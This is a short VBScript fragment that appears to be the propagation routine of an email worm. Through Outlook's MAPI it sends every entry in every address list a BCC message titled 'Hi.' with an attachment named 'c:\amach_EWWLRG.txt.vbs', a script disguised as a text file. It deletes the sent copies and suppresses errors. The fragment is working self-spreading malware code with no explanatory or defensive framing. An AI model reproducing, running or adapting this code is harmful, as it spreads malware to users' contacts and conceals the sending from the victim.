On Error Resume Next
Dim EWWLRGOut1, EWWLRGOut2, EWWLRGOut3, EWWLRGOut4, EWWLRGOut5
Set EWWLRGOut1 = CreateObject( "Outlook.Application" )
Set EWWLRGOut2 = EWWLRGOut1.GetNameSpace( "MAPI" )
For Each EWWLRGOut3 In EWWLRGOut2.AddressLists
For EWWLRGOut4 = 1 To EWWLRGOut3.AddressEntries.Count
Set EWWLRGOut5 = EWWLRGOut1.CreateItem( 0 )
EWWLRGOut5.BCC = EWWLRGOut3.AddressEntries( EWWLRGOut4 ).Address
EWWLRGOut5.Subject = "Hi."
EWWLRGOut5.Body = "Simple caracteres..."
EWWLRGOut5.Attachments.Add "c:\amach_EWWLRG.txt.vbs"
EWWLRGOut5.DeleteAfterSubmit = True
EWWLRGOut5.Send
Next
Next
